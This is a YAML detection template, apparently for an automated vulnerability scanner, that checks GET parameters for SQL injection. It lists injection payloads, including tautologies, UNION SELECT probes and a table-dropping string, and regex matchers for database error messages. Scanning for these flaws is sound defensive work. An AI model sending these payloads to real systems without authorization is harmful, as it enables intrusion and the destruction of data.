id: generic-sqli-get
info:
  name: SQL Injection (GET)
  description: Tests for SQL injection vulnerabilities in GET parameters across discovered endpoints
  owasp_category: A03:2021
  severity: critical
  tags:
    - sqli
    - injection
    - generic

generic:
  endpoint: "{{all_discovered}}"
  method: GET
  parameter: "{{input_param}}"

  payloads:
    - "'"
    - "')"
    - "')))"
    - "' OR '1'='1"
    - "' OR 1=1--"
    - "' AND '1'='2"
    - "' AND 1=0--"
    - "admin'--"
    - "1' OR '1'='1'"
    - "' UNION SELECT NULL--"
    - "' UNION SELECT 1,2,3--"
    - "'; DROP TABLE--"
    - "' OR 1=1#"
    - "admin' OR '1'='1"
    - "' OR 'x'='x"

  matchers:
    - type: regex
      part: body
      condition: or
      regex:
        - 'SQL syntax.*MySQL'
        - 'Warning.*mysql_'
        - 'PostgreSQL.*ERROR'
        - 'ORA-[0-9]{5}'
        - 'Microsoft OLE DB Provider'
        - 'Unclosed quotation mark'
        - 'quoted string not properly terminated'
        - 'sqlite3\.OperationalError'
        - 'SQLITE_ERROR'
        - 'SQL logic error'
        - 'syntax error at or near'
        - 'pg_query\(\)'
        - 'mysql_fetch'
        - 'SQLite.*exception'
        - 'SqlException'
        - 'System\.Data\.SqlClient'
        - 'ODBC.*Drivers? error'
        - 'Fatal error.*SQL'
        - 'PostgreSQL query failed'
        - 'ORA-01756'
        - 'MySQL server version'
        - '<title>Error:.*SQLITE'
        - '<title>Error:.*syntax error'

  matchers_condition: or
